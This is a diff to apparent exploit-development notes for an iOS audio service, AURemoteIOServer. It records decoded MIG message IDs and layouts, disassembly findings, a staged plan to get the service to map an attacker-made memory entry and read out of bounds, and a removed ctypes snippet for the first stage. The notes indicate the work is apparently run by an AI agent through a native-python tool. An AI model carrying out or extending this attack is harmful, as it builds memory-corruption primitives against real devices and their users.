@@ -227,7 +227,7 @@ The IOKit binary from device symbols (`iPhone17,4 26.6.1 (23G83)/Symbols/.../IOK
 
 ### Surface C — AURemoteIOServer MIG shmem substitution (HIGH)
 
-**Status:** Protocol architecture corrected 2026-11-01. Service confirmed accessible. MIG (not XPC). Attack plan updated.
+**Status:** MIG message IDs confirmed, request/reply layouts fully decoded 2026-11-01. Probe script `surface_c_probe.py` rewritten with raw `mach_msg` (no XPC). Ready to run.
 
 **CRITICAL CORRECTION (2026-11-01):** `com.apple.audio.AURemoteIOServer` uses **raw Mach messages via MIG** — not XPC, not NSXPCConnection. Our previous probe script (`xpc_connection_create_mach_service` + `xpc_dictionary`) was aimed at the wrong protocol and cannot work.
 
@@ -277,63 +277,50 @@ The IOKit binary from device symbols (`iPhone17,4 26.6.1 (23G83)/Symbols/.../IOK
 4. AURemoteIOServer calls `InitClient` on our `ne` → maps our shadow page as its audio ring buffer
 5. Write forged ring buffer cursors to `q[0x3000]` → AURemoteIOServer reads OOB
 
-**MIG message IDs:** Not yet determined. Need to resolve:
-- Server routine dispatcher uses `msg_id * 0x28 + 0x1f30a67c0` for table lookup
-- Bounds check implies ~16 valid IDs centered around a base. `0x87d` appears in response handler (possible NewClient reply ID)
-- Next step: disassemble `_AUIOServer_NewClient` request-send stub on client side to read what msg_id it sets
+**MIG message IDs (CONFIRMED from `_AURemoteIO_server_routine` at 0x1bc581f44 + client-side stubs):**
+- `NewClient`  = **0x157c1** (COMPLEX request, size=0x3c; non-complex reply, size=0x28)
+- `Initialize` = **0x157c3** (non-complex request, size=0x78; COMPLEX reply on success, size=0xa4, 3 OOL)
+- Server bounds check: accepts msg_id ∈ [0x157c0, 0x157cf] (16 slots, stride 0x28)
+- Reply msg_id = request_msg_id + 0x64
 
-**Memory situation (2026-11-01 probe attempts):**
-- Stage 1 (alloc + shadow ne + shmem): ran OK at 1826 MB, cost +2.4 MB
-- Stage 2 (XPC connect attempt — now known wrong): crashed at 1826 MB
-- Root cause of crashes: conversation context ~500 MB + 1300 MB baseline = too high
-- Fix: start fresh Claude session immediately and run the 3 stages back to back
+**`__XNewClient` argument extraction (confirmed from disasm at 0x1bc581d8c):**
+- Validates: COMPLEX bit set, size==0x3c, descriptor_count==1
+- Validates: descriptor type==0 (PORT), disposition==17 (MOVE_SEND)
+  - Checked as `ldrh [req+0x26] << 16 == 0x110000` (disposition=0x11, type=0x00)
+- Validates: `req[0x3c]`=audit_trailer.type==0 (kernel appends automatically)
+- Validates: `req[0x40]`=audit_trailer.size > 0x1f (audit trailer = 40 bytes ✓)
+- Args to `_AUIOServer_NewClient(audit_token_ptr, ne_port, w2, w3, w4, &reply_handle)`:
+  - x0 = sp = pointer to audit_token (32 bytes from trailer at req[0x50..0x6f])
+  - **x1 = req[0x1c] = descriptor.name = our shadow ne** (2nd arg, stored at sp+0x20)
+  - x2 = req[0x30] (w2, inline arg)
+  - x3 = req[0x34] (w3 = client_type; 5=tap needs entitlement, 0=standard)
+  - x4 = req[0x38] (w4, inline arg → passed to `AQMESession` as uint, NOT our port)
+  - x5 = reply+0x24 (output ptr for session_handle)
+- Bytes req[0x28..0x2f] (8 bytes) are NOT read — padding
+- On success: reply.msgh_size = 0x28, ret_code at reply[0x20], session_handle at reply[0x24]
 
-**Device probe (service accessible):**
+**`__XInitialize` argument extraction (confirmed from disasm at 0x1bc581680):**
+- Validates: NOT complex (bit 31 must be clear), size==0x78
+- Validates: audit_trailer.type==0, trailer_size>0x1f (same as NewClient)
+- Args: w23=req[0x20] (= session_handle from NewClient), w25=req[0x24], ASBD1 at req[0x28], ASBD2 at req[0x50]
+- On SUCCESS: reply is COMPLEX, msgh_size=0xa4=164, descriptor_count=3
+  - Three 16-byte OOL descriptors (64-bit format: addr(8)+flags(4)+size(4)) at reply[0x1c..0x4b]
+  - Each: deallocate=1, copy=PHYSICAL_COPY=1, type=MACH_MSG_OOL_DESCRIPTOR=1
+  - Kernel fills descriptor.address in-place with OUR task's mapped VA on receive
+  - OOL[0].size = RemoteIOClient+0x368 (audio ring buffer size)
+
+**CRITICAL: Our shadow ne goes to sp+0x20 in `_AUIOServer_NewClient`, NOT to AQMESession.**
+AQMESession gets x4=req[0x38] (a u32 inline arg). The named entry port is used separately.
+The attack may be: server calls `mach_vm_map(our_ne)` during Initialize to fill OOL[0..2] → OOB.
+This is what Stage 5 of the probe verifies (compare OOL addresses to shadow_va).
+
+**Device probe (service accessible, confirmed earlier session):**
 - `com.apple.audio.AURemoteIOServer`: `bootstrap_look_up` kr=0x0 ✓
-- `com.apple.audio.audiohald`: kr=0x44c (does not exist)
 - `com.apple.audio.SystemSoundServer-iOS`: kr=0x0 ✓ (backup target)
 
-**Next session — do this in order:**
-1. Fresh Claude session to get low memory footprint (~800–900 MB)
-2. Determine MIG message IDs: disassemble the `AUIOServer_NewClient` client-side send stub in AudioToolbox (Mac terminal)
-3. Build MIG `NewClient` message with `mach_msg` directly (no XPC), send to AURemoteIOServer port
-4. Build MIG `Initialize` message carrying our shadow `ne` as the ServerToken field
-5. Verify AURemoteIOServer maps our shadow page by checking if forged cursor writes affect its reply
-
-**Staged probe scripts (state persists in `builtins._st` between `mcp__native_python__run_native_python` calls — confirmed same process):**
-
-Stage 1 (alloc + shadow ne — already confirmed):
-```python
-import ctypes as C, builtins
-L=C.CDLL('/usr/lib/libSystem.B.dylib'); X=C.CDLL('/usr/lib/system/libxpc.dylib')
-L.mach_task_self.restype=C.c_uint32; t=L.mach_task_self()
-M=L.mach_make_memory_entry_64
-M.argtypes=[C.c_uint32,C.POINTER(C.c_uint64),C.c_uint64,C.c_int,C.POINTER(C.c_uint32),C.c_uint32]
-V=L.mach_vm_map
-V.argtypes=[C.c_uint32,C.POINTER(C.c_uint64),C.c_uint64,C.c_uint64,C.c_int,C.c_uint32,C.c_uint64,C.c_int,C.c_int,C.c_int,C.c_int]
-L.mach_vm_allocate.argtypes=[C.c_uint32,C.POINTER(C.c_uint64),C.c_uint64,C.c_int]
-a=C.c_uint64(0); L.mach_vm_allocate(t,C.byref(a),0x4000,1)
-p=C.c_uint32(0); ps=C.c_uint64(0x4000); M(t,C.byref(ps),a.value,3,C.byref(p),0)
-c=C.c_uint32(0); cs=C.c_uint64(0x1001); M(t,C.byref(cs),0x1000,3,C.byref(c),p.value)
-m=C.c_uint64(0); V(t,C.byref(m),0x4000,0,1,c.value,0,0,3,3,0)
-q=(C.c_uint8*0x4000).from_address(m.value); q[0x3000]=0xAB
-ne=C.c_uint32(0); ns=C.c_uint64(0x1000); M(t,C.byref(ns),m.value+0x3000,3,C.byref(ne),0)
-m4=C.c_uint64(0); V(t,C.byref(m4),0x4000,0,1,ne.value,0,0,3,3,0)
-builtins._st={"ne": ne.value, "shadow_va": m4.value}
-print(f"Stage 1 OK: ne={ne.value} shadow_va={hex(m4.value)}")
-```
-
-Stage 2 (MIG NewClient — msg_ids TBD, fill after Mac disassembly):
-```python
-# TODO after determining MIG base ID from AUIOServer_NewClient client-side disassembly
-# mach_msg with MACH_MSGH_BITS_COMPLEX, correct msg_id, bootstrap_look_up port
-```
-
-Stage 3 (MIG Initialize with shadow ne as ServerToken):
-```python
-# TODO: send Initialize carrying builtins._st["ne"] as the ServerToken field
-# AURemoteIOServer maps it → write q[0x3000] cursors → OOB in server
-```
+**Probe script:** `kerneldiff/surface_c_probe.py` — fully rewritten with raw `mach_msg` (no XPC).
+Runs all 5 stages: shadow ne → lookup → NewClient → Initialize → parse OOL descriptors.
+Run via `mcp__native_python__run_native_python` with the file contents.
 
 **Backup target if AURemoteIOServer is too hardened:**
 `com.apple.audio.SystemSoundServer-iOS` — also kr=0x0, likely simpler protocol
@@ -392,12 +379,11 @@ Full analysis in STATE.md. Requires kernel exec as precondition.
 
 **← RESUME HERE → (fresh Claude session first — conversation context drives memory up ~500 MB)**
 
-1. **Surface C MIG probe (AURemoteIOServer)** — PROTOCOL NOW KNOWN TO BE MIG, NOT XPC:
-   - Mac terminal: disassemble `_AUIOServer_NewClient` client-side send stub to get MIG base message ID
-   - Build raw `mach_msg` NewClient → send to `bootstrap_look_up("com.apple.audio.AURemoteIOServer")` port
-   - Build raw `mach_msg` Initialize carrying shadow `ne` (from Stage 1) as `SharableMemoryBlock::ServerToken`
-   - AURemoteIOServer maps our ne → write forged cursors → OOB in server process
-   - Staged scripts in `surface_c_stage{1,2,3}.py` in scratchpad (Stage 1 confirmed working)
+1. **Surface C MIG probe (AURemoteIOServer)** — READY TO RUN:
+   - `kerneldiff/surface_c_probe.py` is complete with confirmed msg_ids (0x157c1, 0x157c3)
+   - Run via `mcp__native_python__run_native_python` (fresh session for low memory)
+   - Key observation to make: do OOL descriptor addresses overlap with shadow_va? Is ne used as ring buffer source?
+   - If Initialize fails (ret_code≠0): check if session_handle must be set as a different inline field
 
 2. **Surface 4 stacking amplification** — use child entry as parent; repeat ~0x4000 times for physical OOB primitive
 
